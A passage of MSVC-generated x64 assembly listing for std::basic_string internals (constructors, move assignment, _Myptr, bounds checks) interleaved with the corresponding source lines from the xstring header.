	mov	rdx, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Take_contents

; 3079 :         return *this;

	mov	rax, QWORD PTR this$[rsp]
$LN1@operator:

; 3080 :     }

	add	rsp, 72					; 00000048H
	ret	0
??4?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@$$QEAV01@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator=
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@$$QEAV01@@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 64
_Right$ = 72
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@$$QEAV01@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT

; 2837 :         : _Mypair(_One_then_variadic_args_t{}, _STD move(_Right._Getal())) {

$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rcx, QWORD PTR _Right$[rsp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	rcx, rax
	call	??$move@AEAV?$allocator@D@std@@@std@@YA$$QEAV?$allocator@D@0@AEAV10@@Z ; std::move<std::allocator<char> &>
	mov	rcx, QWORD PTR this$[rsp]
	mov	r8, rax
	movzx	edx, BYTE PTR $T1[rsp]
	call	??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@D@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> >

; 2838 :         _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

	mov	rax, QWORD PTR this$[rsp]
	lea	rdx, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	rcx, rax
	call	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2839 :         _Take_contents(_Right);

	mov	rdx, QWORD PTR _Right$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Take_contents

; 2840 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@$$QEAV01@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 64
_Count$ = 72
_Ch$ = 80
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT

; 2638 :         : _Mypair(_Zero_then_variadic_args_t{}) { // construct from _Count * _Ch

$LN4:
	mov	BYTE PTR [rsp+24], r8b
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rax, QWORD PTR this$[rsp]
	movzx	edx, BYTE PTR $T1[rsp]
	mov	rcx, rax
	call	??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>
	npad	1

; 2639 :         _Construct<_Construct_strategy::_From_char>(_Ch, _Count);

	mov	r8, QWORD PTR _Count$[rsp]
	movzx	edx, BYTE PTR _Ch$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Construct@$0A@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<0,char>
	npad	1

; 2640 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
this$ = 64
_Count$ = 72
_Ch$ = 80
?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z@4HA PROC ; `std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@XZ
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z@4HA ENDP ; `std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 64
_Ptr$ = 72
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT

; 2621 :     _CONSTEXPR20 basic_string(_In_z_ const _Elem* const _Ptr) : _Mypair(_Zero_then_variadic_args_t{}) {

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rax, QWORD PTR this$[rsp]
	movzx	edx, BYTE PTR $T1[rsp]
	mov	rcx, rax
	call	??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>
	npad	1

; 2622 :         _Construct<_Construct_strategy::_From_ptr>(_Ptr, _Convert_size<size_type>(_Traits::length(_Ptr)));

	mov	rcx, QWORD PTR _Ptr$[rsp]
	call	?length@?$_Narrow_char_traits@DH@std@@SA_KQEBD@Z ; std::_Narrow_char_traits<char,int>::length
	mov	rcx, rax
	call	??$_Convert_size@_K@std@@YA_K_K@Z	; std::_Convert_size<unsigned __int64>
	mov	r8, rax
	mov	rdx, QWORD PTR _Ptr$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Construct@$00PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<1,char const *>
	npad	1

; 2623 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
this$ = 64
_Ptr$ = 72
?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z@4HA PROC ; `std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@XZ
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z@4HA ENDP ; `std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 64
_Ptr$ = 72
_Count$ = 80
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT

; 2611 :         : _Mypair(_Zero_then_variadic_args_t{}) {

$LN4:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rax, QWORD PTR this$[rsp]
	movzx	edx, BYTE PTR $T1[rsp]
	mov	rcx, rax
	call	??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>
	npad	1

; 2612 :         _Construct<_Construct_strategy::_From_ptr>(_Ptr, _Count);

	mov	r8, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Ptr$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Construct@$00PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<1,char const *>
	npad	1

; 2613 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
this$ = 64
_Ptr$ = 72
_Count$ = 80
?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z@4HA PROC ; `std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@XZ
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD_K@Z@4HA ENDP ; `std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 33
this$ = 64
_Right$ = 72
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT

; 2586 :         : _Mypair(_One_then_variadic_args_t{}, _Alty_traits::select_on_container_copy_construction(_Right._Getal())) {

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rcx, QWORD PTR _Right$[rsp]
	call	?_Getal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBAAEBV?$allocator@D@2@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Getal
	mov	rdx, rax
	lea	rcx, QWORD PTR $T1[rsp]
	call	?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA?AV?$allocator@D@2@AEBV32@@Z ; std::_Default_allocator_traits<std::allocator<char> >::select_on_container_copy_construction
	mov	rcx, QWORD PTR this$[rsp]
	mov	r8, rax
	movzx	edx, BYTE PTR $T2[rsp]
	call	??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@D@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> >
	npad	1

; 2587 :         _Construct<_Construct_strategy::_From_string>(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

	mov	rax, QWORD PTR _Right$[rsp]
	mov	rcx, rax
	call	?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAPEBDXZ ; std::_String_val<std::_Simple_types<char> >::_Myptr
	mov	rcx, QWORD PTR _Right$[rsp]
	mov	r8, QWORD PTR [rcx+16]
	mov	rdx, rax
	mov	rcx, QWORD PTR this$[rsp]
	call	??$_Construct@$01PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct<2,char const *>
	npad	1

; 2588 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 33
this$ = 64
_Right$ = 72
?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z@4HA PROC ; `std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@XZ
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@AEBV01@@Z@4HA ENDP ; `std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ
_TEXT	SEGMENT
$T1 = 32
this$ = 64
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT

; 2575 :         : _Mypair(_Zero_then_variadic_args_t{}) {

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rax, QWORD PTR this$[rsp]
	movzx	edx, BYTE PTR $T1[rsp]
	mov	rcx, rax
	call	??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>

; 2576 :         _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));

	mov	rax, QWORD PTR this$[rsp]
	lea	rdx, OFFSET FLAT:?_Fake_alloc@std@@3U_Fake_allocator@1@B
	mov	rcx, rax
	call	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy

; 2577 :         _Tidy_init();

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Tidy_init@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Tidy_init

; 2578 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	ret	0
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<char> >::~_String_val<std::_Simple_types<char> >, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, rax
	call	??1_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::~_Bxty
	add	rsp, 40					; 00000028H
	ret	0
??1?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<char> >::~_String_val<std::_Simple_types<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??1_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??1_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<char> >::_Bxty::~_Bxty, COMDAT

; 2313 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers

	mov	QWORD PTR [rsp+8], rcx
	ret	0
??1_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<char> >::_Bxty::~_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Bxty, COMDAT

; 2311 :         _CONSTEXPR20 _Bxty() noexcept : _Ptr() {} // user-provided, for fancy pointers

	mov	QWORD PTR [rsp+8], rcx
	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR [rax], 0
	mov	rax, QWORD PTR this$[rsp]
	ret	0
??0_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Xran@?$_String_val@U?$_Simple_types@D@std@@@std@@SAXXZ
_TEXT	SEGMENT
?_Xran@?$_String_val@U?$_Simple_types@D@std@@@std@@SAXXZ PROC ; std::_String_val<std::_Simple_types<char> >::_Xran, COMDAT

; 2301 :     [[noreturn]] static void _Xran() {

$LN3:
	sub	rsp, 40					; 00000028H

; 2302 :         _Xout_of_range("invalid string position");

	lea	rcx, OFFSET FLAT:??_C@_0BI@CFPLBAOH@invalid?5string?5position@
	call	?_Xout_of_range@std@@YAXPEBD@Z		; std::_Xout_of_range
$LN2@Xran:

; 2303 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Xran@?$_String_val@U?$_Simple_types@D@std@@@std@@SAXXZ ENDP ; std::_String_val<std::_Simple_types<char> >::_Xran
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Check_offset@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAX_K@Z
_TEXT	SEGMENT
this$ = 48
_Off$ = 56
?_Check_offset@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAX_K@Z PROC ; std::_String_val<std::_Simple_types<char> >::_Check_offset, COMDAT

; 2287 :     _CONSTEXPR20 void _Check_offset(const size_type _Off) const {

$LN4:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2288 :         // checks whether _Off is in the bounds of [0, size()]
; 2289 :         if (_Mysize < _Off) {

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR _Off$[rsp]
	cmp	QWORD PTR [rax+16], rcx
	jae	SHORT $LN2@Check_offs

; 2290 :             _Xran();

	call	?_Xran@?$_String_val@U?$_Simple_types@D@std@@@std@@SAXXZ ; std::_String_val<std::_Simple_types<char> >::_Xran
$LN2@Check_offs:
$LN3@Check_offs:

; 2291 :         }
; 2292 :     }

	add	rsp, 40					; 00000028H
	ret	0
?_Check_offset@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAX_K@Z ENDP ; std::_String_val<std::_Simple_types<char> >::_Check_offset
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Large_string_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBA_NXZ
_TEXT	SEGMENT
tv66 = 0
this$ = 32
?_Large_string_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBA_NXZ PROC ; std::_String_val<std::_Simple_types<char> >::_Large_string_engaged, COMDAT

; 2278 :     _CONSTEXPR20 bool _Large_string_engaged() const noexcept {

$LN5:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 2279 : #if _HAS_CXX20
; 2280 :         if (_STD is_constant_evaluated()) {
; 2281 :             return true;
; 2282 :         }
; 2283 : #endif // _HAS_CXX20
; 2284 :         return _BUF_SIZE <= _Myres;

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax+24], 16
	jb	SHORT $LN3@Large_stri
	mov	DWORD PTR tv66[rsp], 1
	jmp	SHORT $LN4@Large_stri
$LN3@Large_stri:
	mov	DWORD PTR tv66[rsp], 0
$LN4@Large_stri:
	movzx	eax, BYTE PTR tv66[rsp]

; 2285 :     }

	add	rsp, 24
	ret	0
?_Large_string_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBA_NXZ ENDP ; std::_String_val<std::_Simple_types<char> >::_Large_string_engaged
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAPEBDXZ
_TEXT	SEGMENT
_Result$ = 32
this$ = 64
?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAPEBDXZ PROC ; std::_String_val<std::_Simple_types<char> >::_Myptr, COMDAT

; 2269 :     _CONSTEXPR20 const value_type* _Myptr() const noexcept {

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 2270 :         const value_type* _Result = _Bx._Buf;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _Result$[rsp], rax

; 2271 :         if (_Large_string_engaged()) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Large_string_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<char> >::_Large_string_engaged
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN2@Myptr

; 2272 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	mov	QWORD PTR _Result$[rsp], rax
$LN2@Myptr:

; 2273 :         }
; 2274 : 
; 2275 :         return _Result;

	mov	rax, QWORD PTR _Result$[rsp]

; 2276 :     }

	add	rsp, 56					; 00000038H
	ret	0
?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBAPEBDXZ ENDP ; std::_String_val<std::_Simple_types<char> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAPEADXZ
_TEXT	SEGMENT
_Result$ = 32
this$ = 64
?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAPEADXZ PROC ; std::_String_val<std::_Simple_types<char> >::_Myptr, COMDAT

; 2260 :     _CONSTEXPR20 value_type* _Myptr() noexcept {

$LN4:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 2261 :         value_type* _Result = _Bx._Buf;

	mov	rax, QWORD PTR this$[rsp]
	mov	QWORD PTR _Result$[rsp], rax

; 2262 :         if (_Large_string_engaged()) {

	mov	rcx, QWORD PTR this$[rsp]
	call	?_Large_string_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<char> >::_Large_string_engaged
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN2@Myptr

; 2263 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	??$_Unfancy@D@std@@YAPEADPEAD@Z		; std::_Unfancy<char>
	mov	QWORD PTR _Result$[rsp], rax
$LN2@Myptr:

; 2264 :         }
; 2265 : 
; 2266 :         return _Result;

	mov	rax, QWORD PTR _Result$[rsp]

; 2267 :     }

	add	rsp, 56					; 00000038H
	ret	0
?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QEAAPEADXZ ENDP ; std::_String_val<std::_Simple_types<char> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xstring
;	COMDAT ??0?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??0?$_String_val@U?$_Simple_types@D@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >, COMDAT

; 2249 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
